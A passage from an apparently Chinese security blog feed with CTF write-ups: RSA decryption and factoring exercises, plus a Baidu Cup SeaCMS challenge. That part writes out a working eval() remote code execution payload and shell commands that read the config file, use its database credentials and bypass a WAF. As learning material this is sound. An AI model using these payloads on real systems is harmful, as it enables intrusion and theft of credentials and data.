class="number">0x1f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3</span></span><br><span class="line">d=<span class="number">8264667972294275017293339772371783322168822149471976834221082393409363691895</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.encode(<span class="string">"hex"</span>)</span><br><span class="line">c = int(data,<span class="number">16</span>)</span><br><span class="line">mingwen = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(mingwen)</span><br><span class="line">result = hex(mingwen)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">result = <span class="string">"0"</span>+result</span><br><span class="line">result = result.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(result)</span><br></pre></td></tr></table></figure><blockquote><p>flag{W0rld_Of_Crypt0gr@phy}</p></blockquote><p>参考：</p><p><a href="https://blog.csdn.net/preserphy/article/details/79599397" target="_blank" rel="noopener">https://blog.csdn.net/preserphy/article/details/79599397</a></p><p><a href="http://wiki.idbg.net/docs/show/41" target="_blank" rel="noopener">http://wiki.idbg.net/docs/show/41</a></p><p>CRC32：<a href="http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本来AFCTF2018校赛前刷了一半了，然后搞校赛了，然后才这个周末刷完。&lt;/p&gt;
&lt;p&gt;待会还有安恒杯月赛，手有点酸，哈哈。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/categories/Misc/"/>
    
      <category term="Bugku-MISC" scheme="http://blog.Lhaihai.wang/categories/Misc/Bugku-MISC/"/>
    
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>第一周RSA加密解密入门</title>
    <link href="http://blog.Lhaihai.wang/2018/05/10/%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <id>http://blog.Lhaihai.wang/2018/05/10/第一周/</id>
    <published>2018-05-10T15:05:34.000Z</published>
    <updated>2018-05-15T05:07:14.172Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-复习密码学"><a href="#0x00-复习密码学" class="headerlink" title="0x00 复习密码学"></a>0x00 复习密码学</h3><p>占个位置慢慢写</p><a id="more"></a><h3 id="0x01-RSA密钥生成"><a href="#0x01-RSA密钥生成" class="headerlink" title="0x01  RSA密钥生成"></a>0x01  RSA密钥生成</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927341309.png" alt="1525927341309"></p><p>题目</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927574315.png" alt="1525927574315"></p><p>直接使用RSA-Tool 工具，因为p和q都是只有数字，所以猜测是十进制，修改右上角的Number Base为10，填入p，q，e（16进制），点击左下角的Cale.D生成密钥d</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927594829.png" alt="1525927594829"></p><h3 id="0x01-RSA解密"><a href="#0x01-RSA解密" class="headerlink" title="0x01 RSA解密"></a>0x01 RSA解密</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525928096379.png" alt="1525928096379"></p><p><a href="https://blog.csdn.net/as3luyuan123/article/details/16812011" target="_blank" rel="noopener">OpenSSL命令—rsautl</a> </p><p>题目：</p><p>拿到一个zip包，用010Editor打开修改密码标记位，解压后有两个文件</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525929032341.png" alt="1525929032341"></p><p>发现imhere文件是私钥，flag是密文</p><p>所以解密命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag -inkey imhere -out a.txt</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525928721540.png" alt="1525928721540"></p><p>打开a.txt即可拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;c42bcf773d54cf03&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-RSA破解"><a href="#0x03-RSA破解" class="headerlink" title="0x03  RSA破解"></a>0x03  RSA破解</h3><p><a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">https://github.com/ius/rsatool</a> </p><p><a href="http://www.whaledu.com/article/17" target="_blank" rel="noopener">RSAtool之python版</a></p><p><a href="http://www.cnblogs.com/pcat/p/5746821.html" target="_blank" rel="noopener">gmpy2安装使用方法</a></p><p>如果kali上不了网，参考下面链接</p><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884" target="_blank" rel="noopener">https://blog.csdn.net/chenyanhui1087/article/details/53127884</a></p><p>注：不需要单独安装gmpy2，只要像下图直接pip install gmpy，pip会把其它依赖包一起装好</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525930763701.png" alt="1525930763701"></p><p>题目：</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525937295679.png" alt="1525937295679"></p><p>解题思路</p><p>只有公钥和密文，爆破公钥拿到 p，q，e，生成私钥，用私钥解密密文</p><p>解题过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# openssl rsa -pubin -text -modulus -in public.pem </span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:ca:00:f5:ed:7b:33:b9:bd:42:1e:77:31:8a:a1:</span><br><span class="line">    78:e7:5d:ed:e3:cb:1b:c7:d4:7a:7d:14:3b:e7:49:</span><br><span class="line">    1c:90:25</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=CA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMoA9e17M7m9Qh53MYqheOdd7ePLG8fU</span><br><span class="line">en0UO+dJHJAlAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>按住shift + 鼠标右键 打开 windows powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> .\msieve153.exe 0xCA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1</span><br><span class="line">BC7D47A7D143BE7491C9025 -v</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525938842077.png" alt="1525938842077"></p><p>得到了，p，q，e，接下来我们要生成私钥了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py  -p 290579950064240059571837821251441436997 -q 314436328879392457343835667929324128609 -e 65537 -o pri.pem-f PEM</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525939930698.png" alt="1525939930698"></p><p>得到私钥后解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey pri.prm -out flag.txt</span><br></pre></td></tr></table></figure><p>flag:</p><p>whalectf{256_n_get}</p><h3 id="0x04-密码学—只有密文"><a href="#0x04-密码学—只有密文" class="headerlink" title="0x04  密码学—只有密文"></a>0x04  密码学—只有密文</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>怎么办，已经截获了密文和模数n！能够破解吗？请分解出RSA中的两个大素数q和p。提交格式是key{x}x为两个素数中较小的那个的MD5前8位。 </p><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><a href="http://www.cnblogs.com/pcat/p/7508205.html" target="_blank" rel="noopener">yafu安装使用方法以及mismatched parens解决方法</a></p><p>感谢小辣鸡的帮助(〃’▽’〃)</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525959883924.png" alt=""></p><p>简单来说就是gcd遍历一遍，gcd（n，某密文）</p><p>gcd（a,b）就是求a，b两个数之间的最大公约数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/10 21:13</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 只有密文.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line"></span><br><span class="line">print(gcd(<span class="number">10</span>,<span class="number">5</span>))</span><br><span class="line">x = open(<span class="string">'E:\\CTF\蓝鲸安全\\第一周\\ciphertext.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> x.readlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Ciphertext'</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> len(line)&gt;<span class="number">2</span>:</span><br><span class="line">        print(gcd(n,int(line[:<span class="number">-1</span>])))</span><br></pre></td></tr></table></figure><p>跑出来一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13038371855775914836995578093728166671103633520203033965827703187246607207039273968425501296569317295959057439253867586769212037981452712871242668046329877</span><br></pre></td></tr></table></figure><p>再算另外一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10367615840240242845371941453623373821227053765532752994306127876946421006862147600725324340607889088707606730457021312059130583835286311559997627141422127</span><br></pre></td></tr></table></figure><p>md5一下小的数</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525960026348.png" alt="1525960026348"></p><p>最后flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;f49d7fe6&#125;</span><br></pre></td></tr></table></figure><p>DJ推荐了个刷密码学的网站：<a href="https://id0-rsa.pub/" target="_blank" rel="noopener">https://id0-rsa.pub/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-复习密码学&quot;&gt;&lt;a href=&quot;#0x00-复习密码学&quot; class=&quot;headerlink&quot; title=&quot;0x00 复习密码学&quot;&gt;&lt;/a&gt;0x00 复习密码学&lt;/h3&gt;&lt;p&gt;占个位置慢慢写&lt;/p&gt;
    
    </summary>
    
      <category term="whalectf" scheme="http://blog.Lhaihai.wang/categories/whalectf/"/>
    
    
      <category term="crypto" scheme="http://blog.Lhaihai.wang/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>百度杯CTF夺旗大赛9月场第三场Test</title>
    <link href="http://blog.Lhaihai.wang/2018/05/06/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%B8%89%E5%9C%BATest/"/>
    <id>http://blog.Lhaihai.wang/2018/05/06/百度杯CTF夺旗大赛9月场第三场Test/</id>
    <published>2018-05-06T05:29:46.000Z</published>
    <updated>2018-05-06T06:49:11.458Z</updated>
    
    <content type="html"><![CDATA[<h3 id="百度杯-九月场-Test"><a href="#百度杯-九月场-Test" class="headerlink" title="百度杯  九月场 Test"></a>百度杯  九月场 Test</h3><hr><a id="more"></a><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>下载解压zip到www，访问upload</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534518399.png" alt="1525534518399"></p><p>安装成功</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534547711.png" alt="1525534547711"></p><p>构造playload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure><p>使用菜刀连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534755429.png" alt="1525534755429"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534772590.png" alt="1525534772590"></p><p>看了一下search.php包含了common.php，根据common.php中的内容发现数据库的链接配置写在data/common.inc.php中。</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534948001.png" alt="1525534948001"></p><p>用户名为root，密码为空，使用菜刀连接数据库    </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535000747.png" alt="1525535000747"></p><p>即可访问数据库</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535071501.png" alt="1525535071501"></p><p>查询 sea_admin表，拿到管理员账号和密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535131544.png" alt="1525535131544"></p><h4 id="I春秋-CTF大本营环境"><a href="#I春秋-CTF大本营环境" class="headerlink" title="I春秋 CTF大本营环境"></a>I春秋 CTF大本营环境</h4><p>尝试使用菜刀连接，但被安全狗过滤了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535542553.png" alt="1525535542553"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535773485.png" alt="1525535773485"></p><p>皮一下很开心，找到一篇使用命令的writeup，那就来吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=$a = `cat data/common.inc.php` ; var_dump(a);</span><br></pre></td></tr></table></figure><p>列当前目录下的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`ls`;var_dump($a);</span><br><span class="line">1=$a=`ls \data`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(198) &quot;admin admin_d41d8cd98f00b204e9800998.php backupdata cache common.inc.php config.cache.bak.php config.cache.inc.php config.ftp.php config.ucenter.php config.user.inc.php cron.cache.php mark sessions &quot;</span><br></pre></td></tr></table></figure><p>获取配置文件,因为是php代码所以在前端看不到，查看源代码就看到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`cat data/common.inc.php`;var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537849621.png" alt="1525537849621"></p><p>————————————源代码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537784520.png" alt="1525537784520"></p><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;show databases;&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(35) &quot;Database information_schema seacms &quot;</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537066568.png" alt="1525537066568"></p><p>获取seacms数据库的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;show tables from seacms&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><p>发现有个敏感表：flag_140ad2e0d8cb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(398) &quot;Tables_in_seacms flag_140ad2e0d8cb sea_admin sea_arcrank sea_buy sea_cck sea_co_cls sea_co_config sea_co_data sea_co_filters sea_co_news sea_co_type sea_co_url sea_comment sea_content sea_count sea_crons sea_data sea_erradd sea_favorite sea_flink sea_guestbook sea_jqtype sea_member sea_member_group sea_myad sea_mytag sea_news sea_playdata sea_search_keywords sea_tags sea_temp sea_topic sea_type &quot;</span><br></pre></td></tr></table></figure><p>尝试从表中获取数据,然而被安全狗拦截了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;select * from seacms.flag_140ad2e0d8cb&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537257166.png" alt="1525537257166"></p><p>手误试了下把*后面的空格去掉，没想到就拿到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;select *from seacms.flag_140ad2e0d8cb&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(48) &quot;flag flag&#123;2bb5a914-8009-476d-b90f-a0fac75d8567&#125; &quot;</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525536396139.png" alt="1525536396139"></p><p>方法二</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;mysql -usea_user -p46e06533407e -e &apos;select *from seacms.flag_140ad2e0d8cb&apos;&quot;);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525538437040.png" alt="1525538437040"></p><p>方法三</p><p>直接绕过貌似比较难，于是先将payload使用base6编码。用两个eval绕过waf的拦截。最后构造的payload如下: </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1520932927_813979.jpg" alt="img"> </p><p>方法四</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537606003.png" alt="1525537606003"></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">Seacms漏洞分析利用复现 By Assassin</a> </p><p><a href="https://www.ichunqiu.com/writeup/detail/1159" target="_blank" rel="noopener">“百度杯”CTF比赛 九月场Test</a></p><p><a href="https://www.ichunqiu.com/writeup/detail/365" target="_blank" rel="noopener">海洋cms前台直接GetShell</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;百度杯-九月场-Test&quot;&gt;&lt;a href=&quot;#百度杯-九月场-Test&quot; class=&quot;headerlink&quot; title=&quot;百度杯  九月场 Test&quot;&gt;&lt;/a&gt;百度杯  九月场 Test&lt;/h3&gt;&lt;hr&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>kali 2.0下安装 metasploit</title>
    <link href="http://blog.Lhaihai.wang/2018/05/05/2-0%E4%B8%8B%E5%AE%89%E8%A3%85metasploit/"/>
    <id>http://blog.Lhaihai.wang/2018/05/05/2-0下安装metasploit/</id>
